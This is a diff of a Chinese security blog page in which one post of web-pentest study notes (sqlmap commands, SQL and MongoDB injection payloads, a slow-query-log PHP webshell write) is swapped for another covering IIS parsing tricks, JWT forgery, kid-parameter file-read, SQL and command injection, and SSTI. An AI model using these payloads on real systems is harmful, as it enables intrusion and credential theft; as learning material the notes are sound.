@@ -9,7 +9,7 @@
     
     <title>
         
-            07Web安全攻防02 |
+            06Web安全攻防01 |
         
         Jackie&#39;s Blog
     </title>
@@ -223,7 +223,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        07Web安全攻防02
+                        06Web安全攻防01
                     </div>
                 
 
@@ -254,7 +254,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Sun Apr 14 2024 16:24:03 GMT+0800">2024-04-14</span>
+                <span class="datetime" data-updated="Sun Apr 14 2024 16:21:13 GMT+0800">2024-04-14</span>
             </span>
         
 
@@ -274,7 +274,7 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.9k 字</span>
             </span>
         
         
@@ -296,133 +296,217 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <h1 id="Web攻防02"><a href="#Web攻防02" class="headerlink" title="Web攻防02"></a>Web攻防02</h1><h1 id="通用安全漏洞"><a href="#通用安全漏洞" class="headerlink" title="通用安全漏洞"></a>通用安全漏洞</h1><h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><blockquote>
-<p>不支持NoSQL、Redis</p>
-</blockquote>
-<p>脚本：tamper</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-u <span class="string">&quot;&lt;网址&gt;&quot;</span><span class="comment">#指定网址</span></span><br><span class="line">--purge<span class="comment">#清除缓存</span></span><br><span class="line">--privileges<span class="comment">#查看权限</span></span><br><span class="line">--is-dba<span class="comment">#是否是数据库管理员</span></span><br><span class="line">--dbs<span class="comment">#获取数据库名</span></span><br><span class="line">--tables<span class="comment">#获取数据库下的表，常搭配-D使用</span></span><br><span class="line">-D <span class="string">&quot;&lt;数据库名&gt;&quot;</span><span class="comment">#指定数据库</span></span><br><span class="line">-T <span class="string">&quot;&lt;表名&gt;&quot;</span><span class="comment">#指定表名</span></span><br><span class="line">--dump -C <span class="string">&quot;&lt;列名&gt;,&lt;列名&gt;&quot;</span><span class="comment">#指定列名</span></span><br><span class="line">---</span><br><span class="line">-r &lt;数据包文件&gt;<span class="comment">#以数据包形式进行注入（解决特定范围）</span></span><br><span class="line">---执行命令</span><br><span class="line">--os<span class="comment">#指定系统</span></span><br><span class="line">--os-cmd=<span class="built_in">id</span><span class="comment">#执行系统命令</span></span><br><span class="line">--os-shell<span class="comment">#系统交互shell</span></span><br><span class="line">--file-read/write<span class="comment">#读/写文件</span></span><br><span class="line">-sql-shell<span class="comment">#执行指定sql命令</span></span><br><span class="line">-reg-read<span class="comment">#读取win系统注册表</span></span><br></pre></td></tr></table></figure>
-
-<p><a class="link"   target="_blank" rel="noopener" href="https://sqlmap.highlight.ink/" >SQLmap中文手册<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html" >SQLmap使用参数<i class="fas fa-external-link-alt"></i></a></p>
-<p>简单的注入流程：</p>
-<ol>
-<li>读取数据库版本，当前用户，当前数据库</li>
+                    <h1 id="Web攻防01"><a href="#Web攻防01" class="headerlink" title="Web攻防01"></a>Web攻防01</h1><ol>
+<li>Web源码</li>
+<li>开发语言</li>
+<li>中间件平台</li>
+<li>数据库类型</li>
+<li>第三方插件或软件</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 -f -b --current-user --current-db -v 1</span><br></pre></td></tr></table></figure>
+<h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><ul>
+<li>ASP环境搭建组合：Windows+IIS+ASP+Access（SQLserver）</li>
+</ul>
+<p>Access数据库一般后缀名 asp asa（前两个被解析） mdb（下载）</p>
+<p>mdb文件在网站目录下</p>
+<blockquote>
+<p>数据库配置：.&#x2F;atabase&#x2F;***.mdb</p>
+<p>后台：.&#x2F;admin&#x2F;admin_login.asp</p>
+</blockquote>
+<p>&#x3D;&#x3D;思路&#x3D;&#x3D;：如果知道数据库地址，可尝试瞎子啊获取数据库文件，获取当前管理员账号密码信息</p>
+<ul>
+<li><p>IIS-短文件&amp;解析&amp;写权限</p>
+<ul>
+<li><p>ASP-中间件-IIS短文件名探针-安全漏洞</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner" >IIS shortname Scanner<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>ASP-中间件-IIS文件上传解析-安全漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*.asp:.jpg</span><br><span class="line">*.asp/1.jpg(*.asp的目录里有1.jpg)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ASP-中间件-IIS配置目录读写-安全配置</p>
+<p>网站配置中勾选了写入，同时Web服务拓展中的WebDAV开启，此时出现写入漏洞</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/k8gege/iisput" >IISPutScanner<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="ASPX"><a href="#ASPX" class="headerlink" title="ASPX"></a>ASPX</h2><ul>
+<li><p>.NET环境搭建组合：Windows+IIS+ASPX+SQLserver</p>
+</li>
+<li><p>.NET配置调试-信息泄露</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/icsharpcode/ILSpy" >ILSpy反编译<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/dnSpyEx/dnSpy" >dnSpy<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><p>.NET项目-Web.config错误调试-信息泄露</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&lt;customErrors mode=<span class="string">&quot;Off&quot;</span>&lt;/customErrors&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">    自定义错误，三种状态<span class="string">&quot;Off&quot;</span>、<span class="string">&quot;On&quot;</span>、<span class="string">&quot;RemoteOnly&quot;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>.NET常见安全问题-未授权访问</p>
+<ol>
+<li>找没有包含验证代码的文件</li>
+<li>验证代码文件有没有可以绕过</li>
+</ol>
+</li>
+</ul>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>详见《PHP特性.md》</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs" >PHP-Audit-Labs<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>详见《Java安全》</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ztosec/secscan-authcheck" >secscan-authcheck<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat" >WebGoat<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/HAN91/p/14585449.html" >webgoat白盒审计+漏洞测试<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><p>通过目录遍历传shell至可执行的文件夹</p>
+</li>
+<li><p>身份验证逻辑</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">问题有很多选项：</span><br><span class="line">s1：你叫什么名字？张三</span><br><span class="line">s2：你的出生地？出生地</span><br><span class="line">s3</span><br><span class="line">...</span><br><span class="line">数据库中没有s3、s4即s3=null s4=mull</span><br><span class="line">此时传入s3= &amp; s4= 发送数据</span><br><span class="line">正确</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>安全验证：固定接收的数据：s0、s1</p>
+<p>不固定：s0、s1判断数据→正常</p>
+<p>​		s2、s3不在数据库或者变量内→非法</p>
+</blockquote>
+<ul>
+<li>JWT：JSON Web令牌（JWT）验证用户的身份</li>
+</ul>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14468030.html" >JWT原理及常见攻击方式<i class="fas fa-external-link-alt"></i></a></p>
+<blockquote>
+<p>判定网站是否采用JWT验证;</p>
+<p>数据包中Cookie可明确看到JWT特有的字符串格式：<strong>三部分，以点为间格</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://jwt.io/" >JWT解密<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p><strong>绕过：</strong></p>
+<ol>
+<li>空加密算法</li>
+</ol>
+<p>在header中指定alg为None</p>
+<p>若某天开发人员在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>
 <ol start="2">
-<li>判断当前数据库用户权限（高权限才能进行文件的读取、命令执行等其他功能）</li>
+<li>修改RSA加密算法为HMAC</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --privileges -U 用户名 -v 1</span><br><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --is-dba -U 用户名 -v 1</span><br></pre></td></tr></table></figure>
+<p>JWT中最常用的两种算法为<strong>HMAC</strong>和<strong>RSA</strong></p>
+<blockquote>
+<p>在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
+</blockquote>
+<p>假设一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
+<p>通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。</p>
+<p>服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>
 <ol start="3">
-<li>读取所有数据库用户或指定数据库用户的密码</li>
+<li>爆破密钥</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --<span class="built_in">users</span> --passwords -v 2</span><br><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --passwords -U root -v 2</span><br></pre></td></tr></table></figure>
-
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker" >c-jwt-cracker<i class="fas fa-external-link-alt"></i></a></p>
+<blockquote>
+<p>前提：</p>
+<ul>
+<li>知悉JWT使用的加密算法</li>
+<li>一段有效的、已签名的token</li>
+<li>签名用的密钥不复杂（弱密钥）</li>
+</ul>
+</blockquote>
 <ol start="4">
-<li>获取所有数据库</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --dbs -v 2</span><br></pre></td></tr></table></figure>
+<li><p>修改KID参数</p>
+<p>kid是jwt header中的一个可选参数，全称是key ID，它用于指定加密算法的密钥</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/home/jwt/.ssh/pem&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<ol start="5">
-<li>获取指定数据库中的所有表</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --tables -D mysql -v 2</span><br></pre></td></tr></table></figure>
+<p>因为该参数可以由用户输入，所以也可能造成一些安全问题。</p>
+<ul>
+<li><p>任意文件读取</p>
+<p>kid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SQL注入</p>
+<p>kid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ``<span class="string">&quot;alg&quot;</span>` `<span class="punctuation">:</span> ``<span class="string">&quot;HS256&quot;</span>``<span class="punctuation">,</span></span><br><span class="line">  ``<span class="string">&quot;typ&quot;</span>` `<span class="punctuation">:</span> ``<span class="string">&quot;jwt&quot;</span>``<span class="punctuation">,</span></span><br><span class="line">  ``<span class="string">&quot;kid&quot;</span>` `<span class="punctuation">:</span> ``<span class="string">&quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>命令注入</p>
+<p>对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;/path/to/key_file|whoami&quot;</span><br></pre></td></tr></table></figure>
 
+<p>对于其他的语言，例如php，如果代码中使用的是exec或者是system来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>
+</li>
+</ul>
+</li>
+<li><p>修改JKU&#x2F;X5U参数</p>
+</li>
+</ol>
+<p>JKU的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于kid，JKU也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>
+<p>X5U则以URI的形式数允许攻击者指定用于验证令牌的<strong>公钥证书或证书链</strong>，与JKU的攻击利用方式类似。</p>
 <ol start="6">
-<li>获取指定数据库名中指定表的字段</li>
+<li>信息泄露</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --columns -D mysql -T <span class="built_in">users</span> -v 2</span><br></pre></td></tr></table></figure>
-
-<ol start="7">
-<li>获取指定数据库命中指定表中指定字段的数据</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --dump -D mysql -T <span class="built_in">users</span> -C <span class="string">&quot;username,password&quot;</span> -s <span class="string">&quot;sqlnmapdb.log&quot;</span> -v 2</span><br></pre></td></tr></table></figure>
-
-<ol start="8">
-<li>file-read读取web文件</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --file-read <span class="string">&quot;/etc/password&quot;</span> -v 2</span><br></pre></td></tr></table></figure>
-
-<ol start="9">
-<li>file-write写入文件到web</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试</span><br></pre></td></tr></table></figure>
-
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><blockquote>
-<p>偏移注入就是解决表名已知，列名未知的情况</p>
-<p><a class="link"   target="_blank" rel="noopener" href="http://t.csdnimg.cn/Jzbb1" >http://t.csdnimg.cn/Jzbb1<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6054320.html" >https://www.cnblogs.com/xishaonian/p/6054320.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/access-offset-injection.html" >https://www.fujieace.com/penetration-test/access-offset-injection.html<i class="fas fa-external-link-alt"></i></a></p>
-</blockquote>
-<p>为了网站和数据库的安全性，MySQL内置有root最高用户，划分等级，每个用户对应管理一个数据库，这样保证互不关联，从而不会影响到其他数据库的运行</p>
-<p>MySQL两种思路：</p>
-<ol>
-<li>非root的注入攻击：常规类的猜解</li>
-<li>root用户的注入攻击：文件读写操作，跨库查询注入等</li>
-</ol>
-<p>MySQL5.0以上版本：自带的数据库名：information_schema</p>
+<p>JWT保证的是数据传输过程中的完整性而不是机密性。</p>
+<p>由于payload是使用base64url编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行base64url解码，就可以读取到payload中携带的信息。</p>
 <blockquote>
-<p>information_schema库中的：</p>
-<p>schemata表会记录所有的数据库名（chehema_name）</p>
-<p>tables表会记录所有的表名（table_name）</p>
-<p>columns表会记录所有的列名（column_name）</p>
+<p>base64url加密是先做base64加密，然后再将-替代+及_替代&#x2F;。</p>
 </blockquote>
-<p>获取相关数据：</p>
-<ol>
-<li>数据库版本-看是否符合information_schema查询-version()</li>
-<li>数据库用户-看是否符合root型注入攻击-user()</li>
-<li>当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os()</li>
-<li>数据库名字-为后期猜解指定数据库下的表、列做准备-database()</li>
-</ol>
-<p>MySQL配置中的secure-file-priv：限制读取&#x2F;写入的文件</p>
-<blockquote>
-<p>Linux下：&#x2F;etc&#x2F;my.cnf</p>
-</blockquote>
-<p><strong>突破</strong>：注入中需要支持SQL执行环境，没有就需要借助PHPmyadmin或能够直接连上对方数据库进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_log_file=&#x27;shell路径&#x27;</span><br><span class="line">select &#x27;&lt;?php eval($_GET[A])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。</p>
-<p><strong>时间默认超过多少的称为慢查询日志？</strong></p>
-<p>一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/skahwah/SQLRecon" >SQLRecon网络侦查与后渗透测试工具<i class="fas fa-external-link-alt"></i></a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 4</span><br><span class="line">and 1=2 union all select null,null,null,null</span><br><span class="line">@@version--获取版本信息</span><br><span class="line">db_name()--当前数据库名字</span><br><span class="line">user、system_user、current_user、user_name--获取当前用户名</span><br><span class="line">@@SERVERNAME--获取服务器主机信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html" >PostgreSQL注入<i class="fas fa-external-link-alt"></i></a></p>
-<figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span></span><br><span class="line">version()<span class="comment">--获取版本信息</span></span><br><span class="line"><span class="built_in">current_user</span><span class="comment">--获取用户名</span></span><br><span class="line">current_database()<span class="comment">--获取当前数据库名</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html" >Oracle注入总结<i class="fas fa-external-link-alt"></i></a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测回显：and 1=2 union select &#x27;1&#x27;,&#x27;2&#x27; from dual</span><br><span class="line">爆库：and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1)from dual</span><br><span class="line">模糊爆库：and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1 and table_name like &#x27;%user%&#x27;) from dual</span><br><span class="line">爆列名：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27;) from dual</span><br><span class="line">爆其他列名：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27; and column_name not in (&#x27;USER_NAME&#x27;))from dual</span><br><span class="line">爆数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot;</span><br><span class="line">爆其他数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot; where USER_NAME&lt;&gt;&#x27;hu&#x27; and user_name&lt;&gt;&#x27;mozhe&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/mongodb-query.html" >MongoDB查询文档<i class="fas fa-external-link-alt"></i></a></p>
-<p>（Python），以墨者为例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db = $mongo-&gt;mozhe_cms_Authority;</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$query = &quot;var data = db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;$id&#x27;&#125;);return data;&quot;;</span><br><span class="line">$obj = $db-&gt;execute($query);</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;body&quot;&gt;</span><br><span class="line">&lt;div class=&quot;title&quot;&gt;&lt;?php echo $obj[&#x27;retval&#x27;][&#x27;title&#x27;];?&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;content&quot;&gt;&lt;?php echo $obj[&#x27;retval&#x27;][&#x27;content&#x27;];?&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其中findOne({‘id’:’$id’})，故需先闭合再执行查询语句，即1&#39;}) and …</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测回显：/new_list.php?id=1&#x27;&#125;);return (&#123;title:1,content:&#x27;2</span><br><span class="line">爆库：/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;1</span><br><span class="line">爆字段：/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;1</span><br><span class="line">---</span><br><span class="line">db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</span><br><span class="line">db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据</span><br></pre></td></tr></table></figure>
-
-<h2 id="数据类型注入"><a href="#数据类型注入" class="headerlink" title="数据类型注入"></a>数据类型注入</h2><ul>
-<li>数字型</li>
-<li>字符型</li>
-<li>搜索型</li>
-<li>加密型（base64、json）等</li>
+<ul>
+<li><p>访问控制</p>
+<ul>
+<li><p>隐藏属性：前端页面的自卫限制显示</p>
+<p>源码中已经暴露的id值、等级之类的编号，可尝试修改值测试是否可以切换到另外用户查看信息</p>
+</li>
+<li><p>水平越权：同一级别用户权限的查看</p>
+</li>
 </ul>
-<h2 id="查询方式注入"><a href="#查询方式注入" class="headerlink" title="查询方式注入"></a>查询方式注入</h2><ul>
-<li>查询</li>
-<li>增加</li>
-<li>删除</li>
-<li>更新</li>
-<li>堆叠</li>
+</li>
+<li><p>反序列化：后续讲</p>
+</li>
 </ul>
-<h2 id="复杂注入利用"><a href="#复杂注入利用" class="headerlink" title="复杂注入利用"></a>复杂注入利用</h2><ul>
-<li>二次注入</li>
-<li>dnslog注入</li>
-<li>绕过bypass等</li>
+<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p><a class="link"   target="_blank" rel="noopener" href="https://vulhub.org/" >Vulhub<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/" >Vulnhub<i class="fas fa-external-link-alt"></i></a></p>
+<p>JavaScript开发的Web应用和PHP、Java、.NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实代码（相当于JS开发的Web应用属于白盒测试（默认有源码参考））</p>
+<ul>
+<li>如何判定JS开发应用？</li>
 </ul>
+<p>源代码简短</p>
+<p>引入多个js文件</p>
+<p>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件</p>
+<p>cookie中有connect.sid</p>
+<ul>
+<li>如何获取更多的js文件？</li>
+</ul>
+<p>JSFinder</p>
+<p>Packer-Fuzzer</p>
+<p>扫描器后缀替换字典</p>
+<ul>
+<li>如何快速获取价值代码？</li>
+</ul>
+<p>method:”get”</p>
+<p>http.get(“</p>
+<p>method:”post”</p>
+<p>http.post(“</p>
+<p>$.ajax</p>
+<p>service.httppost</p>
+<p>service.httpget</p>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><ul>
+<li>Python文件反编译</li>
+<li>Python-Web-SSTI</li>
+<li>SSTI模板注入利用分析</li>
+</ul>
+<hr>
+<p>识别Python网站中间件：Werkzeug</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tool.lu/pyc" >pyc反编译1<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://bugscaner.com/decompyle" >pyc反编译2<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/wibiti/uncompyle2" >uncompyle2<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li>SSTI</li>
+</ul>
+<p>服务端接收用户恶意输入后未经任何处理就将其作为Web应用模板内容的部分。模板引擎在进行目标编译渲染的过程中执行了用户插入的可以破坏模板的语句，因为可能导致了敏感信息泄露</p>
+<p>render_template_string()</p>
+<p>SSTI可能会出现的相关的地方</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/./06Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B201/SSTI%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%87%BA%E7%8E%B0%E7%9A%84%E5%9C%B0%E6%96%B9.jpg"
+                        alt="SSTI可能会出现的地方"
+                 ></p>
 
                 </div>
                 
@@ -472,15 +556,31 @@
                 
                     <div class="post-nav border-box">
                         
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2024/04/14/07Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B202/"
+                                   title="07Web安全攻防02"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">07Web安全攻防02</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/14/06Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B201/"
-                                   title="06Web安全攻防01"
